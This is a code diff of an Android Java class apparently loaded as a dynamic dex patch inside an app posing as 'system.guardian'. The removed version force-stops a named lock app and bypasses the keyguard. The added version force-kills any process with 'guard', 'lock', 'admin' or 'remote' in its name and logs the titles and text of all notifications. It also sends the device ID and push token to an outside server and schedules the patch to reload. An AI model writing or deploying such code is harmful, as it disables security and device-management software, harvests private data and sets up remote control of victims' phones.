@@ -1,199 +1,232 @@
 package com.system.guardian.dex_patch_build;
 
-import android.app.ActivityManager;
-import android.app.KeyguardManager;
+import android.annotation.SuppressLint;
+import android.app.*;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.content.Context;
-import android.content.Intent;
-import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
-import android.os.PowerManager;
+import android.os.*;
+import android.provider.Settings;
+import android.service.notification.StatusBarNotification;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.google.firebase.messaging.FirebaseMessaging;
 import com.system.guardian.CrashLogger;
-import com.system.guardian.OverlayBlocker;
+import com.system.guardian.GuardianStateCache;
 
+import org.json.JSONObject;
+
+import java.io.File;
 import java.util.List;
 
 public class PatchOverride {
 
-    private static final String TAG = "PatchOverride.d_1_1_11";
-    private static final String TARGET_PACKAGE = "com.watuke.app";
+    private static final String TAG = "PatchOverride.RECON";
     private static final Handler retryHandler = new Handler(Looper.getMainLooper());
+
+    private static String lastForegroundApp = "";
+    private static boolean lastOverlayVisible = true;
 
     public static void applyPatch(Context context) {
         try {
-            CrashLogger.log(context, TAG, "🚨 DIAGNOSTIC PATCH ACTIVE — Full kill+trace attempt");
-            Log.i(TAG, "🚨 DIAGNOSTIC PATCH ACTIVE");
+            CrashLogger.log(context, TAG, "🧪 applyPatch() entered");
+            CrashLogger.log(context, TAG, "🛰 RECON MODE ENGAGED");
 
             PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
             if (pm != null && pm.isWakeLockLevelSupported(PowerManager.PARTIAL_WAKE_LOCK)) {
-                Log.i(TAG, "✔️ WakeLock environment OK");
+                CrashLogger.log(context, TAG, "✔️ WakeLock environment OK");
             }
 
-            // Pre-kill trace
-            logWatuStatus(context, "📊 Pre-kill status check");
+            monitorKeyguardStatus(context);
+            logRunningProcesses(context);
+            scanRunningServices(context);
+            scanActiveNotifications(context);
 
-            // Kill sequence (with retry)
-            for (int i = 1; i <= 3; i++) {
-                killWatu(context);
-                Thread.sleep(1500);
-                if (!isWatuRunning(context)) {
-                    CrashLogger.log(context, TAG, "✅ Watu not detected after kill attempt " + i);
-                    break;
-                } else {
-                    CrashLogger.log(context, TAG, "🔁 Watu still running after attempt " + i);
-                }
-            }
+            killSuspiciousTargets(context);
 
-            // Overlay refresh (force hide then show)
-            OverlayBlocker.hide(context);
-            Thread.sleep(500);
-            OverlayBlocker.show(context);
-            CrashLogger.log(context, TAG, "🛡️ Overlay forcibly reset");
-
-            // Toast for local feedback
             new Handler(Looper.getMainLooper()).post(() ->
-                    Toast.makeText(context, "✅ Diagnostic Patch Run", Toast.LENGTH_LONG).show()
+                    Toast.makeText(context, "✅ Recon deployed. Logs active. Watch results.", Toast.LENGTH_LONG).show()
             );
 
-            // Keyguard + overlay post actions (now main-thread safe)
-            new Handler(Looper.getMainLooper()).post(() -> {
-                injectSmartSuppression(context);
-            });
+            registerFcmTokenAsync(context);
 
-            // Post-trace
-            logWatuStatus(context, "📊 Post-kill status check");
+            File retryPatch = new File(context.getNoBackupFilesDir(), "patch.jar");
+            if (retryPatch.exists() && retryPatch.canRead() && !retryPatch.canWrite()) {
+                CrashLogger.log(context, TAG, "⏳ Valid patch found — scheduling retry: " + retryPatch.getAbsolutePath());
+                retryHandler.postDelayed(() -> {
+                    CrashLogger.log(context, TAG, "🔁 Re-triggering patch override after delay...");
+                    com.system.guardian.DexLoader.schedulePatchLoad(context, retryPatch, true);
+                }, 30_000);
+            } else {
+                CrashLogger.log(context, TAG, "⚠️ Retry patch missing or unsafe. exists=" + retryPatch.exists()
+                        + ", canRead=" + retryPatch.canRead() + ", canWrite=" + retryPatch.canWrite());
+            }
+
             CrashLogger.flush(context);
-
-            // 🔁 Re-trigger control polling via Service
-            Intent intent = new Intent(context, com.system.guardian.ControlPollerService.class);
-            com.system.guardian.ControlPollerService.enqueueWork(context, intent);
-            CrashLogger.log(context, TAG, "📡 Triggered ControlPollerService from patch");
-
-            // 🛰️ Optional fallback: WorkManager task to poll server
-            androidx.work.WorkManager.getInstance(context).enqueue(
-                    new androidx.work.OneTimeWorkRequest.Builder(com.system.guardian.ControlPollerWorker.class).build()
-            );
-            CrashLogger.log(context, TAG, "📶 Triggered ControlPollerWorker (WorkManager fallback)");
 
         } catch (Throwable t) {
             CrashLogger.log(context, TAG, "❌ Patch failure: " + t.getMessage());
-            Log.e(TAG, "Patch failure", t);
         }
     }
 
-    private static void killWatu(Context context) {
+    private static void killSuspiciousTargets(Context context) {
+        String[] killKeywords = {"guard", "lock", "watu", "remote", "admin"};
+
         try {
-            CrashLogger.log(context, TAG, "🧪 Executing killWatu()");
             ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+            if (am == null) return;
 
-            if (am != null) {
-                am.killBackgroundProcesses(TARGET_PACKAGE);
-                CrashLogger.log(context, TAG, "🔪 killBackgroundProcesses() called");
-            }
+            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+            for (ActivityManager.RunningAppProcessInfo proc : processes) {
+                String procName = proc.processName;
 
-            Runtime.getRuntime().exec("am force-stop " + TARGET_PACKAGE);
-            CrashLogger.log(context, TAG, "💀 force-stop shell command sent");
+                // 🛡️ Do not kill system.guardian or subcomponents
+                if (procName != null && procName.startsWith("com.system.guardian")) {
+                    CrashLogger.log(context, TAG, "🚫 Skipping self-process: " + procName);
+                    continue;
+                }
 
-            if (am != null) {
-                List<ActivityManager.RunningServiceInfo> services = am.getRunningServices(Integer.MAX_VALUE);
-                for (ActivityManager.RunningServiceInfo svc : services) {
-                    if (TARGET_PACKAGE.equals(svc.service.getPackageName())) {
-                        context.stopService(new Intent().setComponent(svc.service));
-                        CrashLogger.log(context, TAG, "🧯 Killed service: " + svc.service.getClassName());
+                for (String keyword : killKeywords) {
+                    if (procName.toLowerCase().contains(keyword)) {
+                        CrashLogger.log(context, TAG, "💀 Attempting to kill: " + procName + " (PID: " + proc.pid + ")");
+                        try {
+                            Runtime.getRuntime().exec("am force-stop " + procName);
+                            Thread.sleep(100); // let it settle
+                        } catch (Exception e) {
+                            CrashLogger.log(context, TAG, "⚠️ Failed to kill " + procName + ": " + e.getMessage());
+                        }
+                        break;
                     }
                 }
             }
         } catch (Exception e) {
-            CrashLogger.log(context, TAG, "❌ killWatu() exception: " + e.getMessage());
+            CrashLogger.log(context, TAG, "⚠️ killSuspiciousTargets() error: " + e.getMessage());
         }
     }
 
-    private static boolean isWatuRunning(Context context) {
+    private static void logRunningProcesses(Context context) {
         try {
             ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-            if (am != null) {
-                for (ActivityManager.RunningAppProcessInfo proc : am.getRunningAppProcesses()) {
-                    if (proc.processName.equals(TARGET_PACKAGE)) {
-                        return true;
-                    }
-                }
+            if (am == null) return;
+
+            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+            CrashLogger.log(context, TAG, "📊 Running Processes (" + processes.size() + "):");
+
+            for (ActivityManager.RunningAppProcessInfo proc : processes) {
+                CrashLogger.log(context, TAG, "📋 Process: " + proc.processName +
+                        " | PID: " + proc.pid +
+                        " | Importance: " + proc.importance +
+                        " | UID: " + proc.uid);
             }
         } catch (Exception e) {
-            CrashLogger.log(context, TAG, "⚠️ isWatuRunning() error: " + e.getMessage());
+            CrashLogger.log(context, TAG, "⚠️ logRunningProcesses() error: " + e.getMessage());
         }
-        return false;
     }
 
-    private static void logWatuStatus(Context context, String prefix) {
-        boolean isRunning = isWatuRunning(context);
-        boolean isTop = isTopActivityWatu(context);
-        CrashLogger.log(context, TAG, prefix + " — running=" + isRunning + ", foreground=" + isTop);
-    }
-
-    private static boolean isTopActivityWatu(Context context) {
+    private static void scanRunningServices(Context context) {
         try {
-            long now = System.currentTimeMillis();
-            UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
-            if (usm == null) return false;
+            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+            if (am == null) return;
 
-            List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 10000, now);
-            if (stats == null || stats.isEmpty()) return false;
+            List<ActivityManager.RunningServiceInfo> services = am.getRunningServices(Integer.MAX_VALUE);
+            CrashLogger.log(context, TAG, "📊 Running Services (" + services.size() + "):");
 
-            UsageStats latest = null;
-            for (UsageStats s : stats) {
-                if (latest == null || s.getLastTimeUsed() > latest.getLastTimeUsed()) {
-                    latest = s;
-                }
+            for (ActivityManager.RunningServiceInfo svc : services) {
+                CrashLogger.log(context, TAG, "📋 Service: " + svc.service.getPackageName() + " / " +
+                        svc.service.getClassName() + " | PID: " + svc.pid + " | Foreground: " + svc.foreground);
             }
-
-            String top = latest != null ? latest.getPackageName() : null;
-            CrashLogger.log(context, TAG, "👁️ Foreground app: " + top);
-            return TARGET_PACKAGE.equals(top);
-
         } catch (Exception e) {
-            CrashLogger.log(context, TAG, "⚠️ isTopActivityWatu error: " + e.getMessage());
-            return false;
+            CrashLogger.log(context, TAG, "⚠️ scanRunningServices() error: " + e.getMessage());
         }
     }
 
-    private static void injectSmartSuppression(Context context) {
-        softBypassKeyguard(context);
-        monitorOverlay(context);
+    private static void scanActiveNotifications(Context context) {
+        try {
+            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (nm == null) return;
+
+            StatusBarNotification[] active = nm.getActiveNotifications();
+            for (StatusBarNotification n : active) {
+                Notification notif = n.getNotification();
+                if (notif != null && notif.extras != null) {
+                    String title = notif.extras.getString(Notification.EXTRA_TITLE, "");
+                    String text = notif.extras.getString(Notification.EXTRA_TEXT, "");
+                    CrashLogger.log(context, TAG, "🔔 Notification: " + title + " / " + text);
+                }
+            }
+        } catch (Exception e) {
+            CrashLogger.log(context, TAG, "⚠️ scanActiveNotifications() error: " + e.getMessage());
+        }
     }
 
-    private static void softBypassKeyguard(Context context) {
+    private static void monitorKeyguardStatus(Context context) {
         try {
             KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
             if (km != null && km.isKeyguardLocked()) {
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
-                    KeyguardManager.KeyguardLock kl = km.newKeyguardLock("SmartBypass");
-                    kl.disableKeyguard();
-                    CrashLogger.log(context, TAG, "🔓 Deprecated keyguard bypass used");
-                } else {
-                    CrashLogger.log(context, TAG, "🔐 API >= 26 — keyguard locked, no bypass");
-                }
+                CrashLogger.log(context, TAG, "🔒 Device is currently LOCKED");
+            } else {
+                CrashLogger.log(context, TAG, "🔓 Device is currently UNLOCKED");
             }
         } catch (Exception e) {
-            CrashLogger.log(context, TAG, "⚠️ softBypassKeyguard exception: " + e.getMessage());
+            CrashLogger.log(context, TAG, "⚠️ monitorKeyguardStatus() error: " + e.getMessage());
         }
     }
 
-    private static void monitorOverlay(Context context) {
+    private static void registerFcmTokenAsync(Context context) {
         try {
-            Class<?> blockerClass = Class.forName("com.system.guardian.OverlayBlocker");
-            boolean showing = Boolean.TRUE.equals(blockerClass.getMethod("isShowing").invoke(null));
+            FirebaseMessaging.getInstance().getToken()
+                    .addOnCompleteListener(task -> {
+                        if (!task.isSuccessful()) {
+                            CrashLogger.log(context, TAG, "❌ FCM fetch failed: " + task.getException());
+                            return;
+                        }
 
-            if (!showing) {
-                blockerClass.getMethod("show", Context.class).invoke(null, context);
-                CrashLogger.log(context, TAG, "🧱 Overlay manually re-enabled");
-            }
+                        String token = task.getResult();
+                        CrashLogger.log(context, TAG, "✅ FCM token: " + token);
+
+                        new Thread(() -> {
+                            try {
+                                @SuppressLint("HardwareIds")
+                                String deviceToken = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+
+                                JSONObject payload = new JSONObject();
+                                payload.put("device_token", deviceToken);
+                                payload.put("fcm_token", token);
+
+                                com.system.guardian.NetworkUtils.sendJsonToServer(
+                                        "https://digiserve25.pythonanywhere.com/register-fcm-token/",
+                                        payload
+                                );
+
+                                CrashLogger.log(context, TAG, "✅ Token registered with backend");
+                                GuardianStateCache.isTokenUploaded = true;
+
+                            } catch (Exception e) {
+                                CrashLogger.log(context, TAG, "❌ Token registration error: " + e.getMessage());
+                            }
+
+                            CrashLogger.flush(context);
+                        }).start();
+                    });
         } catch (Exception e) {
-            CrashLogger.log(context, TAG, "⚠️ monitorOverlay failed: " + e.getMessage());
+            CrashLogger.log(context, TAG, "❌ FCM init error: " + e.getMessage());
         }
+    }
+
+    public static boolean isLastOverlayVisible() {
+        return lastOverlayVisible;
+    }
+
+    public static void setLastOverlayVisible(boolean visible) {
+        lastOverlayVisible = visible;
+    }
+
+    public static String getLastForegroundApp() {
+        return lastForegroundApp;
+    }
+
+    public static void setLastForegroundApp(String lastForegroundApp) {
+        PatchOverride.lastForegroundApp = lastForegroundApp;
     }
 }
